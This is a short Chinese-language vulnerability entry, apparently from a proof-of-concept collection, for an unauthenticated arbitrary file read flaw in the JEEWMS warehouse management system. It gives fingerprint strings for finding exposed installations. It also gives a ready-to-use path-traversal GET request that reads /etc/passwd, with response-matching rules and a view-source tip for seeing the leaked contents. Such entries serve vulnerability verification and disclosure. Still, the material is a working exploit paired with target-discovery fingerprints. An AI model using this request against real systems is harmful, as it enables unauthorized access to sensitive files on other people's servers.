﻿# JEEWMS存在任意文件读取漏洞

> 更新时间：2024-03-15

> 漏洞编号：

> 漏洞说明：JEEWMS基于JAVA的仓库管理系统（支持3PL（三方物流）和厂内物流），包含PDA端和WEB端，功能涵盖WMS，OMS，BMS（计费管理系统），TMS，成功应用于多家国内知名大客户，客户群体：冷链，干仓，快消品，汽车主机厂和配件厂等行业。JEEWMS存在任意文件读取漏洞，未授权的攻击者可以通过该漏洞读取任意文件，造成敏感信息泄露。

> 漏洞特征：body="plug-in/lhgDialog/lhgdialog.min.js?skin=metro"或者fid="cC2r/XQpJXcYiYFHOc77bg=="

> 验证脚本：HTTP

```
GET /systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd HTTP/1.1
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?root)(?=.*?bin).*?$

> 上传文件定位：

> 验证文件来源：JEEWMS存在任意文件读取漏洞.poc

```
备注说明：敏感文件信息隐藏在网页源代码中，我们可以使用右键查看源代码或者view-source，即：view-source:http://ip/systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd

```
